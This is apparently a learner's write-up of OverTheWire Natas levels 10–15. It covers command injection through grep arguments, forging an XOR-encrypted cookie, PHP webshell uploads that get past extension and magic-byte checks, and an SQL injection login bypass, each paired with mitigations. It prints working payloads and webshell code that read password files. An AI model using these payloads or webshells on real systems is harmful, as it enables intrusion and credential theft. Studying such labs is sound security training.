
## Level 10 → Level 11

**Title:** Command Injection Bypass via Filtered Character Evasion

**Summary:**
This level is a direct follow-up to Level 9 — same search form, same `passthru()` vulnerability underneath. But this time the developer added a filter to block the characters that made the previous exploit work. The filter isn't complete though, and working around it only required thinking about what characters *weren't* blocked and how `grep` itself could be weaponized.

---

### Steps to Reproduce
1. Log in at `http://natas10.natas.labs.overthewire.org`
2. View the source code — the PHP now includes a filter:
   ```php
   if(preg_match('/[;|&]/',$key)) {
       print "Input contains an illegal character!";
   } else {
       passthru("grep -i $key dictionary.txt");
   }
   ```
3. The semicolon (`;`), pipe (`|`), and ampersand (`&`) are blocked — but spaces, `/`, and `#` are not
4. Since `grep` is still running with your input unsanitized, you can pass it a second file path as an argument. Enter this in the search box:
   ```
   .* /etc/natas_webpass/natas11 #
   ```
5. The full command that executes becomes:
   ```bash
   grep -i .* /etc/natas_webpass/natas11 # dictionary.txt
   ```
6. `.*` matches every line, so `grep` prints the entire contents of the password file. The `#` comments out `dictionary.txt` so it doesn't interfere

---

### Impact
Partial input filtering is a recurring failure in security implementations. Developers often block the obvious characters and call it done — but attackers just look for what's still allowed. In this case, no shell metacharacter was even needed; the structure of the `grep` command itself was enough. This is a lesson in why allowlists (only permit known-safe input) are more reliable than blocklists (try to ban known-bad input).

---

### Mitigation
Blocklists are fragile — there will almost always be a character or construct that was missed. The correct fix here is to not pass user input to a shell command at all. PHP has native functions like `preg_match` and file reading functions that can replicate the search functionality without ever invoking a shell. If shell commands are unavoidable, use `escapeshellarg()` to sanitize the input properly and validate it against an allowlist.

---

### Takeaways
- A partial filter is not a fix. If user input still touches a shell, assume it can still be exploited.
- Allowlists beat blocklists every time — define what's acceptable, reject everything else.
- Understanding how tools like `grep` work gives you creative options even when obvious injection characters are blocked.

---
---

## Level 11 → Level 12

**Title:** Cookie Forgery via XOR Encryption Key Recovery (Known-Plaintext Attack)

**Summary:**
This was the most involved level so far. The page stores user preferences in an encrypted cookie, and the password is only revealed if a `showpassword` field inside that cookie is set to `"yes"`. The cookie is XOR-encrypted — which sounds secure. But XOR has a well-known weakness: if you know the plaintext and the ciphertext, you can recover the key. And here, we know both.

---

### Steps to Reproduce
1. Log in at `http://natas11.natas.labs.overthewire.org`
2. View the source code — the cookie stores a JSON object like:
   ```php
   $defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
   ```
   This gets JSON-encoded, XOR-encrypted with a repeating key, then base64-encoded before being set as the cookie
3. Open Burp Suite or DevTools and grab your current cookie value — something like:
   ```
   data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
   ```
4. Base64-decode the cookie, then XOR the result against the known default plaintext (`{"showpassword":"no","bgcolor":"#ffffff"}`) — this recovers the repeating XOR key
5. Use a short PHP script or CyberChef to do this:
   ```php
   $cookie = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
   $plaintext = json_encode(array("showpassword"=>"no","bgcolor"=>"#ffffff"));
   echo $cookie ^ $plaintext;
   // Key revealed: qw8J (repeating)
   ```
6. Now construct a forged cookie with `showpassword` set to `"yes"`:
   ```php
   $newdata = json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"));
   echo base64_encode($newdata ^ str_repeat("qw8J", ceil(strlen($newdata)/4)));
   ```
7. Replace your cookie's `data` value with the forged one, refresh the page — the password for natas12 is displayed

---

### Impact
XOR encryption with a short, repeating key is not encryption — it's obfuscation. Known-plaintext attacks against XOR are a solved problem; the math is straightforward and the key can be recovered completely if the attacker knows any portion of the original data. Trusting XOR-encrypted cookies for security decisions gives a false sense of protection.

---

### Mitigation
Cookies that influence server-side security decisions should be signed with a strong HMAC (e.g., HMAC-SHA256) using a secret key that never leaves the server. Better yet, don't store sensitive state in cookies at all — use server-side sessions referenced by a cryptographically random session ID. If encryption is needed, use a proper authenticated encryption scheme like AES-GCM, not XOR.

---

### Takeaways
- XOR with a repeating key is vulnerable to known-plaintext attacks. If you know any plaintext-ciphertext pair, the key is recoverable.
- "Encrypted" is not the same as "secure." The strength of encryption depends entirely on the algorithm and implementation.
- This level was a real step up — it required understanding XOR at a mathematical level, not just clicking around. Worth revisiting until the concept is solid.

---
---

## Level 12 → Level 13

**Title:** Remote Code Execution via Unrestricted File Upload

**Summary:**
The page allows users to upload a JPEG file. The file extension check, however, is handled entirely on the client side — a hidden HTML form field sets the filename with a `.jpg` extension before the upload happens. Intercepting the request and changing that extension to `.php` means the server stores whatever you upload as an executable PHP file, which you can then browse to and run.

---

### Steps to Reproduce
1. Log in at `http://natas12.natas.labs.overthewire.org`
2. View the source — there's a hidden input that pre-sets the uploaded file's extension:
   ```html
   <input type="hidden" name="filename" value="[random].jpg" />
   ```
3. Create a simple PHP webshell file locally:
   ```php
   <?php echo shell_exec("cat /etc/natas_webpass/natas13"); ?>
   ```
   Save it as `shell.php`
4. Select it for upload, then open Burp Suite and intercept the upload request
5. In the intercepted request, find the `filename` parameter and change `[random].jpg` to `[random].php`
6. Also update the `Content-Type` header to `application/x-php`
7. Forward the request — the server confirms the upload and provides a link to the file
8. Browse to that link — the PHP executes on the server and prints the password for natas13

---

### Impact
Unrestricted file upload leading to Remote Code Execution is one of the most critical web vulnerabilities possible. Once an attacker can execute arbitrary code on the server, the game is effectively over — they can read any file the web server has access to, establish persistence, move laterally, or exfiltrate data. This is a CVSS 10.0 class finding in real environments.

---

### Mitigation
File upload handling needs multiple layers of defense. The filename and extension must be validated server-side — never trust what the client sends. Uploaded files should be renamed to something random with a safe extension, stored outside the web root, and served through a dedicated handler that sets the correct `Content-Type`. The upload directory should never be executable. All of these controls together make it significantly harder to turn a file upload into code execution.

---

### Takeaways
- Client-side validation is no validation. The server must enforce all security checks independently.
- Hidden form fields are just as controllable as visible ones — Burp Suite makes intercepting and modifying them trivial.
- File upload + execution = RCE. This is one of the most impactful vulnerability chains in web security and comes up regularly in bug bounty and CTF alike.

---
---

## Level 13 → Level 14

**Title:** File Upload Bypass via Magic Bytes Manipulation

**Summary:**
Same file upload vulnerability as Level 12, but this time the server checks the file's content — specifically its "magic bytes" (the first few bytes of a file that identify its type) — using PHP's `exif_imagetype()` function. Upload anything that doesn't look like an image and it gets rejected. The fix: prepend a valid JPEG header to your PHP webshell so the check passes, while keeping the PHP code intact after it.

---

### Steps to Reproduce
1. Log in at `http://natas13.natas.labs.overthewire.org`
2. View the source — `exif_imagetype()` is now checking the uploaded file:
   ```php
   if(exif_imagetype($_FILES['uploadedfile']['tmp_name']) != IMAGETYPE_JPEG) {
       echo "File is not a valid image";
   }
   ```
3. Create a file that starts with valid JPEG magic bytes but contains PHP code after:
   ```
   \xff\xd8\xff\xe0  <?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>
   ```
   The easiest way is with a hex editor or a quick Python script:
   ```python
   with open("shell.php", "wb") as f:
       f.write(b"\xff\xd8\xff\xe0")  # JPEG magic bytes
       f.write(b'<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
   ```
4. Upload this file, then intercept the request with Burp Suite and change the filename extension from `.jpg` to `.php`, same as Level 12
5. The `exif_imagetype()` check passes because of the JPEG header
6. Browse to the uploaded file — PHP executes and returns the password for natas14

---

### Impact
Magic byte checks are a slightly stronger defence than extension checks alone, but they're still bypassable. A file can be simultaneously valid-looking to a signature checker and contain malicious code — the check only looks at the beginning of the file. Real-world attackers have used this technique to bypass upload filters on production applications, leading to full server compromise.

---

### Mitigation
Validating file content is better than validating only the extension, but neither is sufficient alone. A proper file upload implementation should: validate the extension server-side, check the MIME type, store the file outside the web root, rename it to strip any executable extension, and never serve uploaded files from a path where the server might execute them. Defence in depth — multiple checks that each have to fail independently — is the right model here.

---

### Takeaways
- Magic bytes are easy to fake. A content-type check is a speed bump, not a wall.
- Combining techniques (magic bytes + extension swap) is realistic — real exploits are often layered like this.
- Defence in depth matters. A single check, however clever, will usually have a workaround.

---
---

## Level 14 → Level 15

**Title:** Authentication Bypass via SQL Injection

**Summary:**
A classic. The page has a login form — username and password. The source reveals the query being built with raw, unsanitized user input. By injecting SQL syntax into the username or password field, it's possible to rewrite the query's logic entirely, bypassing authentication without knowing any valid credentials.

---

### Steps to Reproduce
1. Log in at `http://natas14.natas.labs.overthewire.org`
2. View the source — the SQL query is built directly from user input:
   ```php
   $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
   ```
3. There is zero input sanitisation — the user input is dropped straight into the query string
4. In the username field, enter:
   ```
   " or 1=1 --
   ```
   Leave the password field empty (or put anything)
5. The resulting query becomes:
   ```sql
   SELECT * from users where username="" or 1=1 -- " and password=""
   ```
6. `1=1` is always true, so the `WHERE` clause matches every row. The `--` comments out the rest of the query, including the password check
7. The server sees rows returned and grants access, displaying the password for natas15

You can also enable debug mode to see the query being executed:
```
http://natas14.natas.labs.overthewire.org/?debug
```

---

### Impact
SQL Injection is consistently ranked in the OWASP Top 10 and has been responsible for some of the largest data breaches in history. Authentication bypass is just the entry point — from here an attacker can read, modify, or delete data, extract the entire database, and in some configurations execute OS-level commands. The impact ceiling is very high.

---

### Mitigation
The fix is using **prepared statements** (also called parameterized queries). With prepared statements, user input is never concatenated into the SQL string — it's passed as a separate parameter that the database treats as pure data, never as executable SQL. In PHP:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```
Input validation and an allowlist of permitted characters are useful as additional layers, but they are not substitutes for parameterized queries.

---

### Takeaways
- String concatenation in SQL queries is the root cause of SQL Injection. Spot it in code review and flag it immediately.
- `or 1=1` and comment sequences (`--`, `#`) are foundational SQLi payloads worth understanding deeply.
- Prepared statements are the correct fix — not escaping, not filtering, not a WAF. Parameterize the query.

---

*More levels coming soon. This document is actively updated as I work through the series.*
